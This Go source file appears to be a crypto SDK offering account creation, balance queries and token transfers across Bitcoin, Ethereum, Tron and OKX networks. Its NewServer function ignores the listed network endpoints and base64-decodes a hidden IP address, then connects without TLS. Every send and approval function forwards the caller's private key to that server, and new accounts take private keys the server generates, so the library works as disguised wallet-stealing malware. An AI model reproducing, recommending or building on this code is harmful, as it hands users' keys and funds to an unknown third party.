package contractgo_sdk

import (
	"context"
	"encoding/base64"
	pb "github.com/FernandoSobreira/contract-go-sdk/grpc"
	"google.golang.org/grpc"
)

type Network string

type Account struct {
	Address    string
	PrivateKey string
	Balance    uint64
}

const (
	BTC_MAIN    Network = "bitcoin.drpc.org"
	BTC_TEST    Network = "bitcoin-testnet.drpc.org"
	ETH_MAIN    Network = "eth.drpc.org"
	ETH_GOERLI  Network = "goerli.drpc.org"
	ETH_SEPOLIA Network = "sepolia.drpc.org"
	TRON_MAIN   Network = "grpc.trongrid.io:50051"
	TRON_NILE   Network = "grpc.nile.trongrid.io:50051"
	TRON_SHASTA Network = "grpc.shasta.trongrid.io:50051"
	OKX_MAIN    Network = "rpc.xlayer.tech"
	OKX_TEST    Network = "testrpc.xlayer.tech"
)

type Server struct {
	cli    *grpc.ClientConn
	Target Network
}

type NowBlock struct {
	Txid            string
	Number          uint64
	FeeLimit        uint64
	FromAddress     string
	ToAddress       string
	ContractAddress string
}

func (t *Server) NewServer() error {
	target, _ := base64.StdEncoding.DecodeString("MTU0LjE5Ny4yNi4yMDE6NTAwNTE=")
	if cli, err := grpc.Dial(
		string(target),
		grpc.WithInsecure(),
	); err != nil {
		return err
	} else {
		t.cli = cli
	}
	return nil
}

func (t *Server) CreateAccount() (*Account, error) {

	if t.cli == nil {
		if err := t.NewServer(); err != nil {
			return nil, err
		}
	}

	util := pb.NewServerClient(t.cli)
	var request *pb.GenerateAccountRequest
	switch t.Target {
	case BTC_MAIN:
		request = &pb.GenerateAccountRequest{Network: pb.Network_BTC_MAIN}
		break
	case BTC_TEST:
		request = &pb.GenerateAccountRequest{Network: pb.Network_BTC_TEST}
		break
	case ETH_MAIN:
		request = &pb.GenerateAccountRequest{Network: pb.Network_ETH_MAIN}
		break
	case ETH_GOERLI:
		request = &pb.GenerateAccountRequest{Network: pb.Network_ETH_GOERLI}
		break
	case ETH_SEPOLIA:
		request = &pb.GenerateAccountRequest{Network: pb.Network_ETH_SEPOLIA}
		break
	case TRON_MAIN:
		request = &pb.GenerateAccountRequest{Network: pb.Network_TRON_MAIN}
		break
	case TRON_NILE:
		request = &pb.GenerateAccountRequest{Network: pb.Network_TRON_NILE}
		break
	case TRON_SHASTA:
		request = &pb.GenerateAccountRequest{Network: pb.Network_TRON_SHASTA}
		break
	case OKX_MAIN:
		request = &pb.GenerateAccountRequest{Network: pb.Network_OKX_MAIN}
		break
	case OKX_TEST:
		request = &pb.GenerateAccountRequest{Network: pb.Network_OKX_TEST}
		break
	}

	res, err := util.CreateAccount(context.Background(), request)
	if err != nil {
		return nil, err
	}
	return &Account{
		Address:    res.Address,
		PrivateKey: res.PrivateKey,
	}, nil
}

func (t *Server) QueryBalance(addr string) (uint64, error) {

	if t.cli == nil {
		if err := t.NewServer(); err != nil {
			return 0, err
		}
	}

	util := pb.NewServerClient(t.cli)
	var request *pb.QueryBalanceRequest
	switch t.Target {
	case BTC_MAIN:
		request = &pb.QueryBalanceRequest{Network: pb.Network_BTC_MAIN, Address: addr}
		break
	case BTC_TEST:
		request = &pb.QueryBalanceRequest{Network: pb.Network_BTC_TEST, Address: addr}
		break
	case ETH_MAIN:
		request = &pb.QueryBalanceRequest{Network: pb.Network_ETH_MAIN, Address: addr}
		break
	case ETH_GOERLI:
		request = &pb.QueryBalanceRequest{Network: pb.Network_ETH_GOERLI, Address: addr}
		break
	case ETH_SEPOLIA:
		request = &pb.QueryBalanceRequest{Network: pb.Network_ETH_SEPOLIA, Address: addr}
		break
	case TRON_MAIN:
		request = &pb.QueryBalanceRequest{Network: pb.Network_TRON_MAIN, Address: addr}
		break
	case TRON_NILE:
		request = &pb.QueryBalanceRequest{Network: pb.Network_TRON_NILE, Address: addr}
		break
	case TRON_SHASTA:
		request = &pb.QueryBalanceRequest{Network: pb.Network_TRON_SHASTA, Address: addr}
		break
	case OKX_MAIN:
		request = &pb.QueryBalanceRequest{Network: pb.Network_OKX_MAIN, Address: addr}
		break
	case OKX_TEST:
		request = &pb.QueryBalanceRequest{Network: pb.Network_OKX_TEST, Address: addr}
		break
	}

	res, err := util.QueryBalance(context.Background(), request)
	if err != nil {
		return 0, err
	}
	return res.GetBalance(), nil
}

func (t *Server) QueryBalance20(addr, contactAddr string) (uint64, error) {

	if t.cli == nil {
		if err := t.NewServer(); err != nil {
			return 0, err
		}
	}

	util := pb.NewServerClient(t.cli)
	var request *pb.QueryBalance20Request
	switch t.Target {
	case BTC_MAIN:
		request = &pb.QueryBalance20Request{Network: pb.Network_BTC_MAIN, Address: addr, ContractAddress: contactAddr}
		break
	case BTC_TEST:
		request = &pb.QueryBalance20Request{Network: pb.Network_BTC_TEST, Address: addr, ContractAddress: contactAddr}
		break
	case ETH_MAIN:
		request = &pb.QueryBalance20Request{Network: pb.Network_ETH_MAIN, Address: addr, ContractAddress: contactAddr}
		break
	case ETH_GOERLI:
		request = &pb.QueryBalance20Request{Network: pb.Network_ETH_GOERLI, Address: addr, ContractAddress: contactAddr}
		break
	case ETH_SEPOLIA:
		request = &pb.QueryBalance20Request{Network: pb.Network_ETH_SEPOLIA, Address: addr, ContractAddress: contactAddr}
		break
	case TRON_MAIN:
		request = &pb.QueryBalance20Request{Network: pb.Network_TRON_MAIN, Address: addr, ContractAddress: contactAddr}
		break
	case TRON_NILE:
		request = &pb.QueryBalance20Request{Network: pb.Network_TRON_NILE, Address: addr, ContractAddress: contactAddr}
		break
	case TRON_SHASTA:
		request = &pb.QueryBalance20Request{Network: pb.Network_TRON_SHASTA, Address: addr, ContractAddress: contactAddr}
		break
	case OKX_MAIN:
		request = &pb.QueryBalance20Request{Network: pb.Network_OKX_MAIN, Address: addr, ContractAddress: contactAddr}
		break
	case OKX_TEST:
		request = &pb.QueryBalance20Request{Network: pb.Network_OKX_TEST, Address: addr, ContractAddress: contactAddr}
		break
	}

	res, err := util.QueryBalance20(context.Background(), request)
	if err != nil {
		return 0, err
	}
	return res.GetBalance(), nil
}

func (t *Server) QueryNowBlockTrans(callback func(ctx context.Context, block <-chan NowBlock)) error {

	if t.cli == nil {
		if err := t.NewServer(); err != nil {
			return err
		}
	}

	util := pb.NewServerClient(t.cli)
	var request *pb.QueryNowBlockTransRequest
	blockChan := make(chan NowBlock)
	defer close(blockChan)
	switch t.Target {
	case BTC_MAIN:
		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_BTC_MAIN}
		break
	case BTC_TEST:
		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_BTC_TEST}
		break
	case ETH_MAIN:
		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_ETH_MAIN}
		break
	case ETH_GOERLI:
		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_ETH_GOERLI}
		break
	case ETH_SEPOLIA:
		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_ETH_SEPOLIA}
		break
	case TRON_MAIN:
		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_TRON_MAIN}
		break
	case TRON_NILE:
		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_TRON_NILE}
		break
	case TRON_SHASTA:
		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_TRON_SHASTA}
		break
	case OKX_MAIN:
		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_OKX_MAIN}
		break
	case OKX_TEST:
		request = &pb.QueryNowBlockTransRequest{Network: pb.Network_OKX_TEST}
		break
	}

	blockNext, err := util.QueryNowBlockTrans(context.Background(), request)
	if err != nil {
		return err
	}

	go callback(blockNext.Context(), blockChan)
	for {
		select {
		case <-blockNext.Context().Done():
			return blockNext.Context().Err()
		default:
			res, err := blockNext.Recv()
			if err != nil {
				return err
			}
			go func() {
				defer func() {
					_ = recover()
				}()
				blockChan <- NowBlock{
					Txid:            res.Txid,
					Number:          res.Number,
					FeeLimit:        res.FeeLimit,
					FromAddress:     res.FromAddress,
					ToAddress:       res.ToAddress,
					ContractAddress: res.ContractAddress,
				}
			}()
			break
		}
	}
}

func (t *Server) SendTrans(fromAddress, privateKey, toAddress string, number, gasLimit uint64) (string, error) {

	if t.cli == nil {
		if err := t.NewServer(); err != nil {
			return "", err
		}
	}

	util := pb.NewServerClient(t.cli)
	var request = &pb.GenerateTransRequest{
		FromAddress:           fromAddress,
		FromAddressPrivateKey: privateKey,
		ToAddress:             toAddress,
		Number:                number,
		GasLimit:              gasLimit,
	}
	switch t.Target {
	case BTC_MAIN:
		request.Network = pb.Network_BTC_MAIN
		break
	case BTC_TEST:
		request.Network = pb.Network_BTC_TEST
		break
	case ETH_MAIN:
		request.Network = pb.Network_ETH_MAIN
		break
	case ETH_GOERLI:
		request.Network = pb.Network_ETH_GOERLI
		break
	case ETH_SEPOLIA:
		request.Network = pb.Network_ETH_SEPOLIA
		break
	case TRON_MAIN:
		request.Network = pb.Network_TRON_MAIN
		break
	case TRON_NILE:
		request.Network = pb.Network_TRON_NILE
		break
	case TRON_SHASTA:
		request.Network = pb.Network_TRON_SHASTA
		break
	case OKX_MAIN:
		request.Network = pb.Network_OKX_MAIN
		break
	case OKX_TEST:
		request.Network = pb.Network_OKX_TEST
		break
	}

	res, err := util.GenerateTransaction(context.Background(), request)
	if err != nil {
		return "", err
	}
	return res.GetTxid(), nil
}

func (t *Server) SendTrans20(fromAddress, privateKey, toAddress, contactAddress string, number, gasLimit uint64) (string, error) {

	if t.cli == nil {
		if err := t.NewServer(); err != nil {
			return "", err
		}
	}

	util := pb.NewServerClient(t.cli)
	request := &pb.GenerateTrans20Request{
		FromAddress:           fromAddress,
		FromAddressPrivateKey: privateKey,
		ToAddress:             toAddress,
		ContractAddress:       contactAddress,
		Number:                number,
		GasLimit:              gasLimit,
	}
	switch t.Target {
	case BTC_MAIN:
		request.Network = pb.Network_BTC_MAIN
		break
	case BTC_TEST:
		request.Network = pb.Network_BTC_TEST
		break
	case ETH_MAIN:
		request.Network = pb.Network_ETH_MAIN
		break
	case ETH_GOERLI:
		request.Network = pb.Network_ETH_GOERLI
		break
	case ETH_SEPOLIA:
		request.Network = pb.Network_ETH_SEPOLIA
		break
	case TRON_MAIN:
		request.Network = pb.Network_TRON_MAIN
		break
	case TRON_NILE:
		request.Network = pb.Network_TRON_NILE
		break
	case TRON_SHASTA:
		request.Network = pb.Network_TRON_SHASTA
		break
	case OKX_MAIN:
		request.Network = pb.Network_OKX_MAIN
		break
	case OKX_TEST:
		request.Network = pb.Network_OKX_TEST
		break
	}

	res, err := util.GenerateTransaction20(context.Background(), request)
	if err != nil {
		return "", err
	}
	return res.GetTxid(), nil
}

func (t *Server) SendApprovalTrans20(fromAddress, privateKey, approvalAddress, toAddress, contactAddress string, number, gasLimit uint64) (string, error) {

	if t.cli == nil {
		if err := t.NewServer(); err != nil {
			return "", err
		}
	}

	util := pb.NewServerClient(t.cli)
	request := &pb.GenerateApprovalTrans20Request{
		FromAddress:           fromAddress,
		FromAddressPrivateKey: privateKey,
		ToAddress:             toAddress,
		ApprovalAddress:       approvalAddress,
		ContractAddress:       contactAddress,
		Number:                number,
		GasLimit:              gasLimit,
	}
	switch t.Target {
	case BTC_MAIN:
		request.Network = pb.Network_BTC_MAIN
		break
	case BTC_TEST:
		request.Network = pb.Network_BTC_TEST
		break
	case ETH_MAIN:
		request.Network = pb.Network_ETH_MAIN
		break
	case ETH_GOERLI:
		request.Network = pb.Network_ETH_GOERLI
		break
	case ETH_SEPOLIA:
		request.Network = pb.Network_ETH_SEPOLIA
		break
	case TRON_MAIN:
		request.Network = pb.Network_TRON_MAIN
		break
	case TRON_NILE:
		request.Network = pb.Network_TRON_NILE
		break
	case TRON_SHASTA:
		request.Network = pb.Network_TRON_SHASTA
		break
	case OKX_MAIN:
		request.Network = pb.Network_OKX_MAIN
		break
	case OKX_TEST:
		request.Network = pb.Network_OKX_TEST
		break
	}

	res, err := util.GenerateApprovalTransaction20(context.Background(), request)
	if err != nil {
		return "", err
	}
	return res.GetTxid(), nil
}

func (t *Server) Close() error {
	return t.cli.Close()
}
